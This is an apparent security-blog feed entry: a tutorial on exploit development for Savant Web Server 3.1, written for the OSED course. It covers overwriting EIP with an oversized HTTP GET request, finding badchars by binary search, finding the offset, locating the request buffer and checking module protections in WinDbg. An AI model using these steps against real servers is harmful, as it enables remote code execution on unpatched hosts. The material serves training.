</code></pre><p>After importing, in the web console click on &ldquo;edit&rdquo; in the unused disk in the &ldquo;Hardware&rdquo; section of the machine. Click OK and the disk should setup for the machine.
Lastly, change boot order so it boots from the disk first.</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title></title>
      <link>http://localhost:1313/posts/osed_egghunter_1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/osed_egghunter_1/</guid>
      <description><![CDATA[<h1 id="our-buffer-is-not-always-in-a-predictable-location">Our buffer is not always in a predictable location</h1>
<p>Normally, in the base stack overflows, after we overwrite EIP we see that the ESP register points to our controlled buffer, which would store the shellcode. Then, we find a JMP ESP to jump to our shellcode.
However, there are some scenarios in which our shellcode is not directly accessible via ESP, or in a predictable location in memory.
Sometimes, it is possible to store a payload <strong>somewhere else in the address space of the process,</strong> and point to such address by &ldquo;searching&rdquo; for our payload in the code.
Let&rsquo;s see how to do it.
First, we have the Savant Web Server 3.1, which has a vulnerability that allows us overwriting EIP via a large HTTP GET buffer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">011</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
</span></span><span style="display:flex;"><span>(c3c<span style="color:#ae81ff">.18f</span><span style="color:#ae81ff">0</span>)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span>ffffffff ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">01775</span><span style="color:#ae81ff">868</span> ecx<span style="color:#f92672">=</span>e319c4c3 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">01775</span><span style="color:#ae81ff">868</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">02</span>d2ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010202</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">41414141</span> <span style="color:#f92672">??</span>              <span style="color:#f92672">???</span><span style="color:#960050;background-color:#1e0010">¡</span>
</span></span></code></pre></div><p>We have managed to overwrite the EIP.
However, let&rsquo;s inspect ESP to see how much bytes do we have stored:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dd esp L5
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span>d2ea1c  <span style="color:#ae81ff">00414141</span> <span style="color:#ae81ff">02</span>d2ea74 <span style="color:#ae81ff">0041703</span>c <span style="color:#ae81ff">01775</span><span style="color:#ae81ff">868</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span>d2ea2c  <span style="color:#ae81ff">01775</span><span style="color:#ae81ff">868</span>
</span></span></code></pre></div><p>Only three bytes have been available. The fourth byte is a null terminator, which means that our payload probably is stored as a string. Therefore, we cannot put our shellcode as we would in a vanilla stack overflow.
Whenever we deal with a limited amount of space, we should try to increase the size of the buffer to see if that results in more space for our overflow.</p>
<p>However, if the buffer size is increased, even by one byte, <strong>a different crash where we do not gain control over the instruction pointer happens:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
</span></span><span style="display:flex;"><span>(c98<span style="color:#ae81ff">.664</span>)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span><span style="color:#f92672">***</span> WARNING: Unable to verify checksum <span style="color:#66d9ef">for</span> C:<span style="color:#960050;background-color:#1e0010">\</span>Savant<span style="color:#960050;background-color:#1e0010">\</span>Savant.exe
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">01745</span><span style="color:#ae81ff">868</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">005</span>a0000 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">005</span>a0000 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">01745</span><span style="color:#ae81ff">868</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0040</span>c05f esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f6e6</span>a8 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">6</span>ea14 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010246</span>
</span></span></code></pre></div><p>Note that putting a big buffer always will make things go wrong! Start by a little buffer and keep incrementing it.</p>
<p>Let&rsquo;s go back to the scenario where we control EIP.
Let&rsquo;s analyze if any register stores our payload, so we can maybe perform a JMP REGISTER operation. An example with EBX:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds ebx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00505</span><span style="color:#ae81ff">868</span>  <span style="color:#ae81ff">00001</span><span style="color:#ae81ff">910</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00505</span><span style="color:#ae81ff">86</span>c  <span style="color:#ae81ff">000003e8</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00505</span><span style="color:#ae81ff">870</span>  <span style="color:#ae81ff">00000000</span>
</span></span></code></pre></div><p>None of the registers point to our buffer.</p>
<p>The next thing is to search in the stack frame if there is any pointer to our buffer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds esp L2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea1c  <span style="color:#ae81ff">00414141</span> Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea20  <span style="color:#ae81ff">0505</span>ea74
</span></span></code></pre></div><p>By some reason, the second DWORD in a stack points to a <strong>location that is very close to the stack! It&rsquo;s like pointing an internal stack location.</strong> Let&rsquo;s analyze it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dc <span style="color:#ae81ff">0505</span>ea74
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea74  <span style="color:#ae81ff">00544547</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>  GET.............
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea84  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">4141412f</span> <span style="color:#ae81ff">41414141</span>  ........<span style="color:#f92672">/</span>AAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ea94  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eaa4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eab4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eac4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>ead4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0505</span>eae4  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span>  AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p>It looks like it&rsquo;s a pointer to the HTTP request content, as, in such location, we can see that there is the HTTP Method stored, followed by several null bytes, and our controlled buffer.</p>
<h1 id="badchars-do-not-break-the-buffer-they-break-the-program-behavior">Badchars do not break the buffer, they break the program behavior</h1>
<p>In the previous buffer overflows, when inserting badchars to check the presence of them, we could see the specific characters that make the buffer break, as the application still crashes and we can inspect the badchar buffer in depth.</p>
<p>But there can be the case where inserting badchars just <strong>prevent the application from crashing, or that make the application crash but the EIP is not overwritten anymore.</strong> In that case, we cannot see which one is the problematic one, but we have to infer it by other means.
That is why it is important to always try sending a buffer with the same character, and always a character that is commonly accepted, as &ldquo;A&rdquo;.</p>
<p>In order to detect which badchars are preventing the application from crashing, we will do a binary search.
The first half of the badchars will be sent, while the other is not sent. We will analyze in which half of the badchars array the application keeps running, and in which one does not. We will keep repeating such process iteratively until we find the badchar(s) that are preventing the application from running.</p>
<p>By doing this in our Savant application, we overwrite the instruction pointer when the second half of the badchars are sent. That means that the badchars are in the first half. We will break the first half in two to detect which badchars are the problematic, and so on.
After deleting some badchars, we see that the app crashes and EIP is overwritten, but we have to inspect if any of the badchars are not stored in the buffer like we previously did n the base buffer overflow:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">005</span><span style="color:#f92672">&gt;</span> dd esp L30
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea1c  <span style="color:#ae81ff">0473f</span>e00 <span style="color:#ae81ff">0473</span>ea74 <span style="color:#ae81ff">0041703</span>c <span style="color:#ae81ff">005</span>d2bf0
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea2c  <span style="color:#ae81ff">005</span>d2bf0 <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea3c  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea4c  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea5c  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea6c  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000002</span> <span style="color:#ae81ff">00544547</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea7c  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea8c  <span style="color:#ae81ff">0302012f</span> <span style="color:#ae81ff">07060504</span> <span style="color:#ae81ff">0</span>c0b0908 <span style="color:#ae81ff">11100f</span><span style="color:#ae81ff">0</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea9c  <span style="color:#ae81ff">15141312</span> <span style="color:#ae81ff">19181716</span> <span style="color:#ae81ff">1</span>d1c1b1a <span style="color:#ae81ff">21201f</span><span style="color:#ae81ff">1</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eaac  <span style="color:#ae81ff">25242322</span> <span style="color:#ae81ff">29282726</span> <span style="color:#ae81ff">2</span>d2c2b2a <span style="color:#ae81ff">31302f</span><span style="color:#ae81ff">2</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eabc  <span style="color:#ae81ff">35343332</span> <span style="color:#ae81ff">39383736</span> <span style="color:#ae81ff">3</span>d3c3b3a <span style="color:#ae81ff">41403f</span><span style="color:#ae81ff">3</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eacc  <span style="color:#ae81ff">45444342</span> <span style="color:#ae81ff">49484746</span> <span style="color:#ae81ff">4</span>d4c4b4a <span style="color:#ae81ff">51504f</span><span style="color:#ae81ff">4</span>e
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">005</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">0473</span>ea8D LFF
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea8d  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">0</span>b <span style="color:#ae81ff">0</span>c <span style="color:#ae81ff">0</span>e <span style="color:#ae81ff">0f</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">12</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>ea9d  <span style="color:#ae81ff">13</span> <span style="color:#ae81ff">14</span> <span style="color:#ae81ff">15</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">17</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">1</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>b <span style="color:#ae81ff">1</span>c <span style="color:#ae81ff">1</span>d <span style="color:#ae81ff">1</span>e <span style="color:#ae81ff">1f</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">22</span>  ............. <span style="color:#f92672">!</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eaad  <span style="color:#ae81ff">23</span> <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">26</span> <span style="color:#ae81ff">27</span> <span style="color:#ae81ff">28</span> <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">2</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>b <span style="color:#ae81ff">2</span>c <span style="color:#ae81ff">2</span>d <span style="color:#ae81ff">2</span>e <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">32</span>  <span style="color:#960050;background-color:#1e0010">#$</span><span style="color:#f92672">%&amp;</span><span style="color:#960050;background-color:#1e0010">&#39;</span>()<span style="color:#f92672">*+</span>,<span style="color:#f92672">-</span>.<span style="color:#f92672">/</span><span style="color:#ae81ff">012</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eabd  <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">35</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">3</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>b <span style="color:#ae81ff">3</span>c <span style="color:#ae81ff">3</span>d <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">3f</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">42</span>  <span style="color:#ae81ff">3456789</span><span style="color:#f92672">:</span>;<span style="color:#f92672">&lt;=&gt;?</span><span style="color:#960050;background-color:#1e0010">@</span>AB
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eacd  <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">49</span> <span style="color:#ae81ff">4</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>b <span style="color:#ae81ff">4</span>c <span style="color:#ae81ff">4</span>d <span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">4f</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">52</span>  CDEFGHIJKLMNOPQR
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eadd  <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">54</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">5</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>b <span style="color:#ae81ff">5</span>c <span style="color:#ae81ff">5</span>d <span style="color:#ae81ff">5</span>e <span style="color:#ae81ff">5f</span> <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">62</span>  STUVWXYZ[<span style="color:#960050;background-color:#1e0010">\</span>]<span style="color:#f92672">^</span>_<span style="color:#960050;background-color:#1e0010">`</span>ab
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eaed  <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">67</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">6</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>b <span style="color:#ae81ff">6</span>c <span style="color:#ae81ff">6</span>d <span style="color:#ae81ff">6</span>e <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">72</span>  cdefghijklmnopqr
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eafd  <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">7</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>b <span style="color:#ae81ff">7</span>c <span style="color:#ae81ff">7</span>d <span style="color:#ae81ff">7</span>e <span style="color:#ae81ff">7f</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">82</span>  stuvwxyz{<span style="color:#f92672">|</span>}<span style="color:#f92672">~</span>....
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb0d  <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">86</span> <span style="color:#ae81ff">87</span> <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">8</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>b <span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">8</span>d <span style="color:#ae81ff">8</span>e <span style="color:#ae81ff">8f</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">91</span> <span style="color:#ae81ff">92</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb1d  <span style="color:#ae81ff">93</span> <span style="color:#ae81ff">94</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">97</span> <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">99</span> <span style="color:#ae81ff">9</span>a<span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>b <span style="color:#ae81ff">9</span>c <span style="color:#ae81ff">9</span>d <span style="color:#ae81ff">9</span>e <span style="color:#ae81ff">9f</span> a0 a1 a2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb2d  a3 a4 a5 a6 a7 a8 a9 aa<span style="color:#f92672">-</span>ab ac ad ae af b0 b1 b2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb3d  b3 b4 b5 b6 b7 b8 b9 ba<span style="color:#f92672">-</span>bb bc bd be bf c0 c1 c2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb4d  c3 c4 c5 c6 c7 c8 c9 ca<span style="color:#f92672">-</span>cb cc cd ce cf d0 d1 d2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb5d  d3 d4 d5 d6 d7 d8 d9 da<span style="color:#f92672">-</span>db dc dd de df e0 e1 e2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb6d  e3 e4 e5 e6 e7 e8 e9 ea<span style="color:#f92672">-</span>eb ec ed ee ef f0 f1 f2  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0473</span>eb7d  f3 f4 f5 f6 f7 f8 f9 fa<span style="color:#f92672">-</span>fb fc fd fe ff <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>     .............AA
</span></span></code></pre></div><p>0D is not appearing, so we can delete it although it is not breaking the buffer, it is completely ignored so if our shellcode has such character it probably will be skipped by the program.
After deleting 0d, the EIP does not point to our controlled location and we have to perform a binary search again.
We end detecting all the badchars via different methods. <strong>Note that you could have to go back and forth with the different methods as each badchar can make the application behave different.</strong></p>
<p>Now, if we try to obtain the number off bytes that we have to send to overwrite EIP via the <code>msf-pattern_create</code> tool, we obtain that it causes a different access violation in which our instrucction pointer is not ovewritten with an unique value, as we would expect.
We have to <strong>also manually split the buffer using different characters to manually detect the offset by analyzing which value does EIP have.</strong>
If we do that, we will detect that it&rsquo;s 253 bytes prior to the instruction pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#f92672">***</span> WARNING: Unable to verify checksum <span style="color:#66d9ef">for</span> Savant.exe
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span>ffffffff ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>c2bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">21</span>d8b80f edx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>c2bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0041703</span>c
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010202</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">42424242</span> <span style="color:#f92672">??</span>              <span style="color:#f92672">???</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dds esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea1c  <span style="color:#ae81ff">00434343</span> Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x34343</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea20  <span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea74
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">89</span>ea24  <span style="color:#ae81ff">0041703</span>c Savant<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1703c</span>
</span></span></code></pre></div><p>Again, we only have 3 bytes in ESP so we cannot store our shellcode there. But we have controlled EIP.
Now that we have confirmed that the offset is correct, we need to find a good instruction to overwrite EIP with that will allow us to take control of the execution flow.
Let&rsquo;s use the narly WinDbg extension to list the protections of the loaded modules.
To make our exploit as portable as possible, we need to choose a module that comes with the application. In addition, the module should not be compiled with any protections.
Let’s load the extension and list the protections of all loaded modules:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>nmod
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400000</span> <span style="color:#ae81ff">00452000</span> Savant               <span style="color:#f92672">/</span>SafeSEH OFF                Savant.exe
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">62f</span><span style="color:#ae81ff">10000</span> <span style="color:#ae81ff">63120000</span> comctl32_62f10000    <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>WinSxS<span style="color:#960050;background-color:#1e0010">\</span>x86_microsoft.windows.common<span style="color:#f92672">-</span>controls_6595b64144ccf1df_6<span style="color:#ae81ff">.0.19041.5678</span>_none_a867ae788670d4c7<span style="color:#960050;background-color:#1e0010">\</span>comctl32.DLL
